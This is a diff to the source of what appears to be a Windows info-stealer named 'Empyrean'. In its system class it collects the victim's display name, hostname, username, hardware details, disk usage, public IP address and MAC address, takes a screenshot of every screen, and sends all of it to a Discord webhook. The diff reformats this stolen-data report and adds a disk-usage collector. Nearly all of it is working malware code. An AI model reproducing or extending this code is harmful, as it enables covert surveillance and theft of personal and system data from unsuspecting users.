@@ -475,18 +475,16 @@ class chromium():
 class system():
     def __init__(self, webhook: str) -> None:
         webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
-        embed = Embed(title="System Information", color=0x000000)
-        
-        embed.add_field(name="Display Name", value=self.get_display_name(), inline=True)
-        embed.add_field(name="Hostname", value=os.getenv("COMPUTERNAME"), inline=True)
-        embed.add_field(name="Username", value=os.getenv("USERNAME"), inline=True)
-        
-        embed.add_field(name="CPU", value=wmi.WMI().Win32_Processor()[0].Name, inline=True)
-        embed.add_field(name="GPU", value=wmi.WMI().Win32_VideoController()[0].Name, inline=True)
-        embed.add_field(name="RAM", value=round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0), inline=True)
+        embed = Embed(title="\u200b", color=0x000000)
+
+        embed.add_field(name=":bust_in_silhouette: User", value=f"```Display Name: {self.get_display_name()}\nHostname: {os.getenv('COMPUTERNAME')}\nUsername: {os.getenv('USERNAME')}```", inline=False)
+        embed.add_field(name="<:CPU:1004131852208066701> System", value=f"```CPU: {wmi.WMI().Win32_Processor()[0].Name}\nGPU: {wmi.WMI().Win32_VideoController()[0].Name}\nRAM: {round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)}```", inline=False)
+        embed.add_field(name=":floppy_disk: Disk", value=f"```{self.get_disk_space()}```", inline=False)
+        embed.add_field(name="<:wifi:1004131855374749807> Network", value=f"```IP: {requests.get('https://api.ipify.org').text}\nMAC: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```", inline=False)
         
         ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None).save("screenshot.png")
         embed.set_image(url="attachment://screenshot.png")
+        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Windows_logo_-_2012_%28dark_blue%29.svg/2048px-Windows_logo_-_2012_%28dark_blue%29.svg.png")
         
         try:
             webhook.send(embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
@@ -505,7 +503,18 @@ class system():
     
         nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
         GetUserNameEx(NameDisplay, nameBuffer, size)
+        
         return nameBuffer.value
+    
+    def get_disk_space(self):
+        disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
+        for part in psutil.disk_partitions(all=False):
+            if os.name == 'nt':
+                if 'cdrom' in part.opts or part.fstype == '': continue
+            usage = psutil.disk_usage(part.mountpoint)
+            disk += ("{:<9} "*4).format(part.device, f"{usage.free/float(1<<30):,.0f} GB", f"{usage.total/float(1<<30):,.0f} GB", usage.percent) + "\n"
+        
+        return disk
 
 class injection:
     def __init__(self, webhook: str):
